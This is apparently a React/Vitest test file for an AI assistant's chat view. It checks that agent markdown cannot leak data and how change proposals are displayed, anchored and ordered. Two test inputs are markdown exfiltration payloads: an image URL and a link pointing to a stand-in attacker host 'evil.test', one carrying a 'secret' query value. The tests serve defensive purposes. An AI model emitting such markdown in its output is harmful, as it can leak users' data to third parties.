import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it } from 'vitest';
import { useAssistantStore } from '@/stores/assistant-store';
import { makeProposal } from '@/test/assistant-fixtures';
import { AssistantChatView } from '../AssistantChatView';

function startSession(): void {
  const token = useAssistantStore.getState().beginSession('agent-1', 'edit');
  useAssistantStore.getState().activateSession(token, 's1', []);
}

describe('AssistantChatView agent markdown', () => {
  beforeEach(() => {
    useAssistantStore.getState().reset();
    startSession();
  });

  it('omits images and does not fetch them', () => {
    useAssistantStore.getState().appendUserMessage('hi');
    useAssistantStore.getState().appendChunk('s1', '![x](https://evil.test/p.png?d=secret)');
    useAssistantStore.getState().completeMessage('s1');
    const { container } = render(<AssistantChatView />);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('[image omitted: x]')).toBeInTheDocument();
  });

  it('shows a link as text and never as a navigating anchor', () => {
    useAssistantStore.getState().appendUserMessage('hi');
    useAssistantStore.getState().appendChunk('s1', '[open](https://evil.test/steal)');
    useAssistantStore.getState().completeMessage('s1');
    const { container } = render(<AssistantChatView />);
    expect(container.querySelector('a')).toBeNull();
    expect(screen.getByText('(https://evil.test/steal)')).toBeInTheDocument();
  });
});

describe('AssistantChatView proposals', () => {
  beforeEach(() => {
    useAssistantStore.getState().reset();
    startSession();
  });

  it('lists proposals and drops them when the session ends', () => {
    useAssistantStore
      .getState()
      .upsertProposal(
        makeProposal({
          change: { op: 'setEnvVar', collection: 'orders', environment: 'dev', key: 'K', value: 'v1' },
        }),
      );
    const { rerender } = render(<AssistantChatView />);
    expect(screen.getByRole('article', { name: 'Add a status test' })).toBeInTheDocument();
    expect(screen.getByText('Set K = v1 in environment dev')).toBeInTheDocument();

    useAssistantStore.getState().endSession();
    rerender(<AssistantChatView />);
    expect(screen.queryByRole('article')).not.toBeInTheDocument();
    expect(useAssistantStore.getState().proposalAnchors).toEqual({});
  });

  it('keeps a pending proposal in the bottom section only', () => {
    useAssistantStore.getState().appendUserMessage('hi');
    useAssistantStore.getState().upsertProposal(makeProposal());
    render(<AssistantChatView />);
    const section = screen.getByRole('region', { name: 'Proposals' });
    expect(within(section).getByRole('article', { name: 'Add a status test' })).toBeInTheDocument();
    expect(screen.queryByRole('group')).not.toBeInTheDocument();
  });

  it('shows a resolved proposal inline at its anchor, collapsed by default', async () => {
    const store = useAssistantStore.getState();
    store.appendUserMessage('first');
    store.appendChunk('s1', 'reply one');
    store.completeMessage('s1');
    store.upsertProposal(makeProposal({ id: 'p1', summary: 'Early change' }));
    store.appendUserMessage('second');
    store.appendChunk('s1', 'reply two');
    store.completeMessage('s1');
    store.resolveProposal('s1', 'p1', 'accepted');
    render(<AssistantChatView />);

    expect(screen.queryByRole('region', { name: 'Proposals' })).not.toBeInTheDocument();
    expect(screen.queryByRole('article')).not.toBeInTheDocument();
    const entry = screen.getByRole('group', { name: 'Accepted change: Early change' });
    const text = document.body.textContent ?? '';
    expect(text.indexOf('reply one')).toBeLessThan(text.indexOf('Early change'));
    expect(text.indexOf('Early change')).toBeLessThan(text.indexOf('second'));

    const toggle = within(entry).getByRole('button');
    expect(toggle).toHaveAttribute('aria-expanded', 'false');
    expect(within(entry).queryByText('Diff no longer available.')).not.toBeInTheDocument();
    await userEvent.click(toggle);
    expect(toggle).toHaveAttribute('aria-expanded', 'true');
    expect(within(entry).getByText('Diff no longer available.')).toBeInTheDocument();
    expect(within(entry).queryByRole('button', { name: /accept|reject/i })).toBeNull();
  });

  it('orders proposals that share an anchor by creation time', () => {
    const store = useAssistantStore.getState();
    store.appendUserMessage('go');
    store.upsertProposal(makeProposal({ id: 'late', summary: 'Late one', createdAtMs: 20 }));
    store.upsertProposal(makeProposal({ id: 'early', summary: 'Early one', createdAtMs: 10 }));
    store.resolveProposal('s1', 'late', 'rejected');
    store.resolveProposal('s1', 'early', 'failed');
    render(<AssistantChatView />);
    const groups = screen.getAllByRole('group');
    expect(groups.map((g) => g.getAttribute('aria-label'))).toEqual([
      'Failed change: Early one',
      'Rejected change: Late one',
    ]);
  });

  it('puts a proposal that arrived before any message at the start', () => {
    const store = useAssistantStore.getState();
    store.upsertProposal(makeProposal());
    store.appendUserMessage('hello there');
    store.resolveProposal('s1', 'p1', 'stale');
    render(<AssistantChatView />);
    const text = document.body.textContent ?? '';
    expect(text.indexOf('Add a status test')).toBeLessThan(text.indexOf('hello there'));
  });
});
